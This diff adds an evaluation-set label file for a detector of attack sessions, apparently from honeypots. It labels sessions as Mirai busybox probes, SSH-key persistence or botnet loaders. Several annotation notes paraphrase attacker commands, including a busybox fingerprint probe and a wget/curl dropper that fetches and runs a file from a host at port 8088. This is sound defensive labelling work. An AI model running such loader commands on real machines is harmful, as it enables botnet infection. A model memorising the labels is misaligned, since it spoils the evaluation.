@@ -1,0 +1,113 @@
+# Eval-set labels. One block per session_id. Edit by hand and
+# flip `annotated: false -> true` when you've labeled the block.
+# The renderer preserves your edits and backfills any new fields.
+# Validate every ~25 entries with:
+#   console/.venv/bin/python scripts/validate_eval_labels.py \
+#     --labels eval/labels-v2.yaml \
+#     --unlabeled eval/sessions-v2.unlabeled.jsonl
+# Rubric: ./RUBRIC.md
+
+06a431513bf9:
+  annotated: true
+  is_real: true
+  playbook_label: mirai_busybox_probe
+  expected_findings: []
+  notes: 'Negative test case: A is Mirai pre-payload fingerprint (sh/shell/enable/system
+    + /bin/busybox cat /proc/self/exe); paired with 10f4c2a31687 which is an
+    ssh-key persistence playbook. Share coarse intent but behaviorally distinct.'
+  divergent_pair_id: dp-002
+
+10f4c2a31687:
+  annotated: true
+  is_real: true
+  playbook_label: ssh_key_chattr_persistence
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-002
+
+5734386f4346:
+  annotated: true
+  is_real: true
+  playbook_label: ssh_key_chattr_persistence
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-005
+
+bda68569dc9e:
+  annotated: true
+  is_real: true
+  playbook_label: botnet_loader
+  expected_findings: []
+  notes: 'Negative test case: B is nohup curl/wget/dev-tcp triple-fallback loader
+    (/linux fetch + execute + /tmp/.opass beacon); paired with 5734386f4346 which
+    is mdrfckr ssh-key persistence. Different behaviors.'
+  divergent_pair_id: dp-005
+
+9cec6a9eacd4:
+  annotated: true
+  is_real: true
+  playbook_label: ssh_key_chattr_persistence
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-006
+
+e749d0d7ed3c:
+  annotated: true
+  is_real: true
+  playbook_label: mirai_busybox_probe
+  expected_findings: []
+  notes: 'Negative test case: B is SHELL_TEST + /bin/busybox TEST + cat /proc
+    pre-payload probe; paired with 9cec6a9eacd4 which is mdrfckr ssh-key persistence.
+    Different behaviors.'
+  divergent_pair_id: dp-006
+
+08f16b250109:
+  annotated: true
+  is_real: true
+  playbook_label: botnet_loader
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-007
+
+28c779e9b7a2:
+  annotated: true
+  is_real: true
+  playbook_label: botnet_loader
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-007
+
+64194724dd24:
+  annotated: true
+  is_real: true
+  playbook_label: ssh_key_chattr_persistence
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-008
+
+e04f8d0729ba:
+  annotated: true
+  is_real: true
+  playbook_label: ssh_key_chattr_persistence
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-008
+
+26fa69739089:
+  annotated: true
+  is_real: true
+  playbook_label: mirai_busybox_probe
+  expected_findings: []
+  notes: ''
+  divergent_pair_id: dp-009
+
+2eb4e5a2260b:
+  annotated: true
+  is_real: true
+  playbook_label: botnet_loader
+  expected_findings: []
+  notes: 'Negative test case: B chains a Mirai-style shell-escalation probe
+    (enable/system/shell/linuxshell) into a full multi-transport dropper
+    (wget+curl+busybox wget http://192.168.1.1:8088/i + chmod + ./i); paired with
+    26fa69739089 which is pre-payload busybox sentinel probe only. Loader vs probe.'
+  divergent_pair_id: dp-009
